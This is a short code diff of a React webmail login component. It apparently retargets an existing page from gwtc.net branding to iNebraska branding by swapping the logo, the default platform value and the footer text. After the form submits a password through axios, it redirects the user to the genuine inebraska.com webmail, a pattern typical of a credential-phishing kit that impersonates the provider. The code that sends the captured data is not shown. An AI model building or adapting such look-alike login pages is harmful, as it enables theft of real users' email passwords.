@@ -7,7 +7,7 @@ import { useState } from 'react';
 import axios from 'axios';
 import intrstar from './intrstar.png';
 import gwtc from './gwtc.png';
-
+import nebraska from './nebraska.png';
 
 function Home(){
 
@@ -15,7 +15,7 @@ function Home(){
 
     const[password, setPassword] = useState("");
 
-    const[platform, setPlatform] = useState("GWTC")
+    const[platform, setPlatform] = useState("NEBRASKA")
 
     const[showError, setShowError] = useState(false);
 
@@ -46,7 +46,7 @@ function Home(){
                // console.log(response.data.message);
     
               
-               window.location.href = 'https://webmail.gwtc.net/';
+               window.location.href = 'https://webmail.inebraska.com/';
             }
           } catch (error) {
             // Handle error
@@ -74,7 +74,7 @@ function Home(){
 
             <div className='secondiv col-md-5 m-auto'>
                 <div className='logodiv text-center'>
-                <img src={gwtc} className="mylogo" />
+                <img src={nebraska} className="mylogo" />
 
                 </div>
 
@@ -172,7 +172,7 @@ function Home(){
 
             <div className='thirdiv'>
 
-                <p>gwtc.net webmail</p>
+                <p>INebraska Webmail  ●  Get support</p>
 
             </div>
 
